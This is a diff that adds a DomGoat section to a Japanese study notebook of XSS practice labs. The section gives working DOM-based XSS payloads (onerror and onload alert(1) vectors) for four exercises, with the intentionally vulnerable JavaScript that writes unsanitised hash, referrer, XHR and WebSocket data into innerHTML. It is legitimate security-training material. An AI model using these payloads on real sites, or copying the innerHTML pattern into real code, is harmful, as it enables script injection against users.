@@ -1670,6 +1670,131 @@ https://macchinetta.github.io/server-guideline/current/ja/Security/XSS.html
 ### 18 IE
 ### 19 ページが動いてない
 
+## DomGoat
+### 1 (location.hash -> .innerHTML)
+`https://domgo.at/cxss/example/1?payload=abcd&sp=x#%3Cimg%20src=/%20onerror=alert(1)%3E`でXSS成功！  
+**Vunlerable code**  
+```html
+    let hash = location.hash;
+    if (hash.length > 1) {
+        let hashValueToUse = unescape(hash.substr(1));
+        let msg = "Welcome <b>" + hashValueToUse + "</b>!!";
+        document.getElementById("msgboard").innerHTML = msg;
+    }
+```
+### 2 (document.referer -> .innerHTML)
+`https://domgo.at/cxss/example/1?payload=%3Csvg/onload=alert(1)%3E&sp=x#12345`でExcercise１にアクセスした後に２にアクセスする。  
+ページを遷移しないとだめ。Excercise２上でリロードしたもののRefererヘッダーをBurpで書き換えても`document.referer`は上書きできずダメだった。開発者ツールのConsoleで`document.referer`を上書きしてもダメだった。  
+**Vunlerable code**  
+```html
+    let rfr = document.referrer;
+    let paramValue = unescape(getPayloadParamValueFromUrl(rfr));
+    if (paramValue.length > 0) {
+        let msg = "Welcome <b>" + paramValue + "</b>!!";
+        document.getElementById("msgboard").innerHTML = msg;
+    } else {
+        document.getElementById("msgboard").innerHTML = "Parameter named <b>payload</b> was not found in the referrer.";
+    }
+```
+### 3 (XHR JSON -> .innerHTML)
+`<img src=/ onerror=alert(1)>`を入力すると`https://domgo.at/data.json?payload=<img src=/ onerror=alert(1)>`をXHRで送信して`payload	"<img src=/ onerror=alert(1)>"`というJSONが返ってくる。  
+**Vunlerable code**  
+```html
+    let processPayload = function () {
+
+        let payload = document.getElementById('payloadbox').value;
+
+        var xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function () {
+            if (this.readyState === 4 && this.status === 200) {
+                if (debuggerEnabled) {
+                    debugger;
+                }
+                let responseBody = xhr.responseText;
+                let responeBodyObject = JSON.parse(responseBody);
+                let msg = "Welcome <b>" + responeBodyObject.payload + "</b>!!";
+                document.getElementById("msgboard").innerHTML = msg;
+
+                //Data flow info
+                document.getElementById("srcvalue").textContent = responeBodyObject.payload;
+                document.getElementById("valuetosink").textContent = msg;
+                document.getElementById("fullMsg").textContent = JSON.stringify(responeBodyObject, null, "\t");
+            }
+        };
+        xhr.open("GET", '/data.json?payload=' + escape(payload), true);
+        xhr.send();
+    };
+
+    processPayload();
+```
+### 4 (WebSocket JSON -> .innerHTML)
+`<img src=/ onerror=alert(1)>`  
+今度はXHRじゃなくてWebSocketを使用して入力に応じて`{  "payload": "aaaaaa"}`のようなJSONを返す。  
+![image](https://user-images.githubusercontent.com/56021519/103761496-1d131280-505a-11eb-801d-314340366727.png)  
+
+**Vunlerable code**  
+```html
+    let webSocketUrl = (location.protocol === "https:" ? "wss://" : "ws://") + location.host + "/ws";
+    document.getElementById("wsUrl").textContent = webSocketUrl;
+
+    let showFullResponse = function (btn) {
+        $("#msgModal").modal();
+        return false;
+    };
+
+    let debuggerEnabled = false;
+    let toggleDebugging = function () {
+        debuggerEnabled = !debuggerEnabled;
+        if (debuggerEnabled) {
+            document.getElementById("debugToglrBtn").className = "text-muted";
+        } else {
+            document.getElementById("debugToglrBtn").className = "text-danger";
+        }
+    };
+
+    let ws = new WebSocket(webSocketUrl);
+    ws.onmessage = function (evt) {
+        if (debuggerEnabled) {
+            debugger;
+        }
+        try {
+            let rawMsg = evt.data;
+            let msgJson = JSON.parse(rawMsg);
+            let msg = "Welcome <b>" + msgJson.payload + "</b>!!";
+            document.getElementById("msgboard").innerHTML = msg;
+
+            //Data flow info
+            document.getElementById("srcvalue").textContent = msgJson.payload;
+            document.getElementById("valuetosink").textContent = msg;
+            document.getElementById("fullMsg").textContent = JSON.stringify(msgJson, null, "\t");
+        } catch (e) {
+            console.log(e);
+        }
+    };
+
+    ws.onopen = function () {
+        processPayload();
+        
+    };
+
+
+    let processPayload = function () {
+
+        let payload = document.getElementById('payloadbox').value;
+        ws.send(payload);
+    };
+```
+### 2
+**Vunlerable code**  
+```html
+
+```
+### 2
+**Vunlerable code**  
+```html
+
+```
+
 ## 動作環境ナシ
 ### XSS Challenge(セキュリティ・ミニキャンプ in 岡山 2018)
 https://szarny.hatenablog.com/entry/2019/01/01/XSS_Challenge_%28%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%83%BB%E3%83%9F%E3%83%8B%E3%82%AD%E3%83%A3%E3%83%B3%E3%83%97_in_%E5%B2%A1%E5%B1%B1_2018_%E6%BC%94%E7%BF%92%E3%82%B3%E3%83%B3   
